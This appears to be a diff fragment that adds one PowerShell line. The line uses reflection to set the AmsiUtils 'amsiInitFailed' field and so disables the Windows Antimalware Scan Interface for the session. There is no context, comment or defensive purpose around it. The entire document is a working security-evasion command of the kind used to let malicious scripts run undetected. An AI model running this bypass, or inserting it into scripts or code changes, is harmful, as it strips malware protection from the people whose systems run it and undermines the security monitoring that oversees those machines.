@@ -1,0 +1,1 @@
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',$true).SetValue($null,$true)
